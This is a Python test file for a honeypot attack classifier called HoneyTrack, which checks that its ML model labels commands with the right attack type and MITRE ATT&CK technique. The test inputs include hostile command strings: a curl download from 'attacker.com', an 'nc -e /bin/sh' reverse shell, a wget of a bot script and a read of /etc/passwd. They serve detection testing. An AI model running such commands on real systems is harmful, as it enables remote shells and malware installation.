"""
Test suite for HoneyTrack Machine Learning Attack Classifier (v1.2).
"""

import sys
import os

PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

from analysis.ml_classifier import classify_attack_ml, extract_features, ml_classifier
from analysis.fingerprint import analyze_event

def test_feature_extraction():
    print("[+] Test 1: Feature Extraction")
    feat = extract_features(
        service="SSH",
        username="root",
        password="secretpassword",
        command="curl -O http://attacker.com/malware.sh && chmod +x malware.sh",
        attempt_count=5,
        is_tor=True
    )
    assert len(feat) == 19, f"Expected 19 features, got {len(feat)}"
    # Has url feature
    assert feat[5] == 1.0, "URL indicator must be active"
    # Has chain feature
    assert feat[6] == 1.0, "Command chain indicator must be active"
    # Has download tool feature
    assert feat[8] == 1.0, "Download tool indicator must be active"
    # Is tor feature
    assert feat[13] == 1.0, "Tor flag must be active"
    print("  -> PASS: Feature extraction correctly engineered 19 features.")

def test_ml_predictions():
    print("\n[+] Test 2: ML Model Predictions & MITRE ATT&CK Mapping")
    
    # 1. Reverse shell detection
    r_rev = classify_attack_ml(service="SSH", command="nc -e /bin/sh 10.0.0.1 4444")
    assert r_rev["attack_type"] == "reverse_shell", f"Expected reverse_shell, got {r_rev['attack_type']}"
    assert r_rev["mitre_id"] == "T1059.004"
    assert r_rev["confidence"] >= 0.8
    print(f"  -> Reverse shell: {r_rev['attack_type']} (conf: {r_rev['confidence']}, MITRE: {r_rev['mitre_id']})")

    # 2. Malware download detection
    r_dl = classify_attack_ml(service="SSH", command="wget http://1.2.3.4/bot.sh")
    assert r_dl["attack_type"] == "malware_download", f"Expected malware_download, got {r_dl['attack_type']}"
    assert r_dl["mitre_id"] == "T1105"
    print(f"  -> Malware download: {r_dl['attack_type']} (conf: {r_dl['confidence']}, MITRE: {r_dl['mitre_id']})")

    # 3. High-velocity Brute Force
    r_bf = classify_attack_ml(service="SSH", username="root", password="123", attempt_count=12)
    assert r_bf["attack_type"] == "brute_force"
    assert r_bf["mitre_id"] == "T1110"
    print(f"  -> Brute force: {r_bf['attack_type']} (conf: {r_bf['confidence']}, MITRE: {r_bf['mitre_id']})")

    # 4. System Reconnaissance
    r_recon = classify_attack_ml(service="SSH", command="uname -a")
    assert r_recon["attack_type"] == "recon"
    assert r_recon["mitre_id"] == "T1082"
    print(f"  -> Recon: {r_recon['attack_type']} (conf: {r_recon['confidence']}, MITRE: {r_recon['mitre_id']})")

    print("  -> PASS: All attack vectors classified with correct MITRE techniques.")

def test_fingerprint_pipeline_integration():
    print("\n[+] Test 3: End-to-End Fingerprint Pipeline Integration")
    res = analyze_event(
        source_ip="127.0.0.1",
        service="SSH",
        username="root",
        command="cat /etc/passwd",
        attempt_count=1
    )
    assert res["attack_type"] == "recon"
    assert "ml_confidence" in res
    assert "anomaly_score" in res
    assert res["mitre_id"] == "T1082"
    assert res["mitre_name"] == "System Information Discovery"
    print(f"  -> Full Pipeline Analysis Result: {res}")
    print("  -> PASS: ML classifier fully integrated into fingerprinting engine.")

if __name__ == "__main__":
    test_feature_extraction()
    test_ml_predictions()
    test_fingerprint_pipeline_integration()
    print("\n==========================================")
    print("ALL ML CLASSIFIER TESTS PASSED (100% OK)")
    print("==========================================\n")
